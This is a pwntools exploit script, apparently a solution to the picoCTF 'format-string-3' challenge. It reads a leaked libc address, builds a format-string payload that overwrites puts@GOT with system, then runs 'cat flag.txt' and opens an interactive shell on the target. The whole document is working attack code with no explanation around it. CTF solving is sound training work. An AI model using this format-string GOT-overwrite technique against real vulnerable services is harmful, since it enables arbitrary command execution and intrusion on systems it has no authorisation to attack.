#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 61630
HOST = "rhea.picoctf.net"
exe = context.binary = ELF("./format-string-3_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)
ld = ELF("./ld-linux-x86-64.so.2", checksec = False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b*0x4012e3
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# Leak libc_base

p.recvuntil(b"in libc: ")
libc_leak = int(p.recvline()[:-1], 16)
libc.address = libc_leak - 0x7a3f0
log.info("libc_base: " + hex(libc.address))

# Overwrite puts@got -> system

system = libc.sym.system
part1 = system & 0xff
part2 = system >> 8 & 0xffff
print(hex(system))
print(hex(part1))
print(hex(part2))
fmt = f"%{part1}c%42$hhn".encode()
fmt += f"%{part2 - part1}c%43$hn".encode()

pl = flat(
    fmt.ljust(0x20, b"A"),
    exe.got.puts,
    exe.got.puts + 1

    )
# GDB()

p.sendline(pl)
p.sendline(b"cat flag.txt")

p.interactive()
